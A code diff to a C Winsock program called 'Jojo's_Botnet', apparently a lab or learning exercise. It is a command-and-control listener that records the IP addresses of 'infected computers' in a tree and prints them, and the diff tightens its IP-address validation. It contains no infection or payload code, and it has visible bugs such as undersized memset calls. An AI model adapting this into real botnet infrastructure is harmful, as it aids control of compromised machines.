@@ -3,14 +3,13 @@
 # include <winsock2.h>
 # include <ws2tcpip.h>
 # include <stdlib.h>
-# define DEFAULT_PORT "23019"
-# define DEFAULT_BUFLEN 512
-# define C2_IP "10.0.0.25"
-# define MAXENDP 100 // This code records a maximum of 100 endpoints, INCLUDEING the C&C
+# include <ctype.h>
+# define DEFAULT_PORT "23019" 
+# define C2_IP "10.0.0.25" // IP address of the C&C server
+# define MAXENDP 100 // This code records a maximum of 100 endpoints, INCLUDING the C&C
 # define LINE_FEED 10
 # define MAX_IP_LEN 16
 #define PADDING_DIFF 5
-#define SOCKET_STOP "0\n"
 
 /*
 Name: Jojo's_Botnet
@@ -22,13 +21,12 @@ The code receives TCP transmissions from infected computers and saves it as a tr
 Finally it prints the whole tree.  
 */
 
-// TO DO --> Add victim ip input check
 
 // Structures
 typedef struct tnode {
 	char* victim_ip;
 	struct tnode* father;
-	struct tnode* children[MAXENDP - 1]; // A child node must have at least 2 other node before him.
+	struct tnode* children[MAXENDP - 1]; // A child node will always have another node before him.
 } treenode;
 struct addrinfo* result = NULL, * ptr = NULL, hints;
 
@@ -53,13 +51,12 @@ int main(){
 		pserver->victim_ip = strdup(C2_IP);
 		pserver->father = NULL;
 		
-		// Initialize children[] to 0.
-		for(int i = 0; i < MAXENDP-1; i++){
-			pserver->children[i] = 0;
-		}
+		// Initialize server's children to 0.
+		memset(pserver->children, '\0', MAXENDP-2);
 		
 		// Receive until the peer shuts down the connection or maxium endpoints have been infected.
-		for(int i = 0; i < MAXENDP; i++){
+		for(int i = 0; i < 4; i++){
+			
 			// Open socket.
 			SOCKET ClientSocket = Socket_Accept();
 			char *ip, *f_ip;
@@ -67,15 +64,17 @@ int main(){
 			f_ip = (char *) malloc((MAX_IP_LEN + 1) * sizeof(char));
 			Recive_Data(ClientSocket, ip, f_ip);
 			
-			// Check to confirm that the father exists in the tree.
+			// Check to confirm that the recieved data is valid.
 			while(Search_Node(pserver, f_ip) == NULL){
-				printf("Jojo_BN: Could not find %s in infected computers\n", f_ip);
+				
+				// Close existing connection.
 				closesocket(ClientSocket);
 				WSACleanup();
 				SOCKET ClientSocket = Socket_Accept();
 				Recive_Data(ClientSocket, ip, f_ip);
 			}
-			
+				
+			// Add new node to the tree.
 			treenode newnode, *mynode; 
 			mynode = &newnode;
 			mynode = (treenode *) malloc(sizeof(treenode));
@@ -88,7 +87,7 @@ int main(){
 		
 		// Print all nodes.
 		printf("\n---Infected Computers---");
-		printf("\n");
+		printf("\n\n");
 		Print_Tree(pserver, 0);
 		printf("\n");
 		printf("You Did It!!!");
@@ -115,10 +114,7 @@ treenode* Add_Node(treenode* pnode, treenode *server, char* victim_ip, char* fat
 	pnode->father = pfather_node; // sets pointer to father
 	
 	// Initialize children[] to 0.
-	for(int i = 0; i < MAXENDP-1; i++){
-		pnode->children[i] = (treenode *) malloc(sizeof(treenode));
-		pnode->children[i] = NULL;
-	}
+	memset(pnode->children, '\0', MAXENDP-2);
 	
 	// Adding the new node to it's father's children array.
 	Add_Child(pfather_node, pnode);
@@ -148,8 +144,7 @@ treenode* Search_Node(treenode *node, char *ip) {
 		return node;
 		
 	}
-	printf("Jojo_BN\\Search_Node: ERROR - node %s (%p) ip %s", node->victim_ip, node, ip);
-	printf("\n");
+	printf("Jojo's_BN\\Search_Node: Could not find father's IP address in infected computers\n");
 	return NULL;
 }
 
@@ -262,6 +257,46 @@ SOCKET Socket_Accept() {
 	return ClientSocket;
 }
 
+int Recive_Data(SOCKET ClientSocket, char * ip, char *f_ip){
+	// Recive data from client and assign it to the function's arguments.
+	
+	char recvbuf[MAX_IP_LEN];
+	int recv_res;
+	int recvbuflen = MAX_IP_LEN;
+	
+	// Recive 2 strings of data: victim ip and father ip.
+	for(int i = 1; i <= 2; i++){
+			memset(recvbuf, '\0', MAX_IP_LEN);
+			recv_res = recv(ClientSocket, recvbuf, recvbuflen, 0);
+			
+			// Verify that data was sent
+			if(recv_res > 0){
+				if (Process_IP(recvbuf) != 0){
+					printf("Data Recived: %s\n", recvbuf);
+				
+					// Assign data to victim's ip or father's ip by order.
+					switch(i){
+						case 1:
+							strcpy(ip, recvbuf);
+							break;
+						case 2:
+							strcpy(f_ip, recvbuf);
+							break;
+					}
+				}
+				else{
+					printf("Jojo's_BN\\Recive_Data: Illegal IP address - %s\n", recvbuf);
+					return 0;
+				}
+			}
+			else{
+				printf("Jojo's_BN\\Recive_Data: Illegal IP address - %s\n", recvbuf);
+				return 0;
+			}
+		}
+	return 1;
+}
+
 int Process_IP(char str[]){
 // Remove unnecessary charachters from recived data and check for illegal input.
 	
@@ -275,50 +310,30 @@ int Process_IP(char str[]){
 		if(str[i] != '\n' && str[i] != ' ' && str[i] != LINE_FEED){
 			
 			// Verify that data is digits.
-			if( '9' >= str[i] || str[i] >= '0' || str[i] == '.'){  // I didn't use isdigit() to spare this only use of ctype.h
-				temp[j++] = str[i];
-			}
-			else{
-				printf("Jojo_BN\\Process_IP: Illegal IP address.");
-				return 0;
-			}
-		}
-	}
-	temp[j] = '\0';
-	strcpy(str, temp);
-	return 1;
-}
-
-int Recive_Data(SOCKET ClientSocket, char * ip, char *f_ip){
-	// Recive data from client and assign it to the function's arguments.
-	
-	char recvbuf[DEFAULT_BUFLEN];
-	int recv_res;
-	int recvbuflen = DEFAULT_BUFLEN;
-	
-	// Recive 2 strings of data: victim ip and father ip.
-	for(int i = 1; i <= 2; i++){
-			memset(recvbuf, '\0', DEFAULT_BUFLEN);
-			recv_res = recv(ClientSocket, recvbuf, recvbuflen, 0);
-			
-			// Verify that data was sent
-			if(recv_res > 0){
-				Process_IP(recvbuf);
-				printf("Data Recived: %s\n", recvbuf);
+			if( isdigit(str[i]) || str[i] == '.'){  // I didn't use isdigit() to spare this only use of ctype.h
 				
-				// Assign data to victim's ip or father's ip by order.
-				switch(i){
-					case 1:
-						strcpy(ip, recvbuf);
-						break;
-					case 2:
-						strcpy(f_ip, recvbuf);
-						break;
+				// Check for 2 dots in a row.
+				if(str[i] == *(str + (i - 1)) && str[i] == '.'){
+					return 0;
+				}
+				else if(str[i] == '.' && i == 0){
+					return 0;
+				}
+				else{
+					temp[j++] = str[i];
 				}
 			}
 			else{
 				return 0;
 			}
 		}
+	}
+	
+	// Check if the IP address ends with '.' (incorrect address)
+	if(*(temp + (j - 1)) == '.'){
+		return 0;
+	}
+	temp[j] = '\0';
+	strcpy(str, temp);
 	return 1;
 }
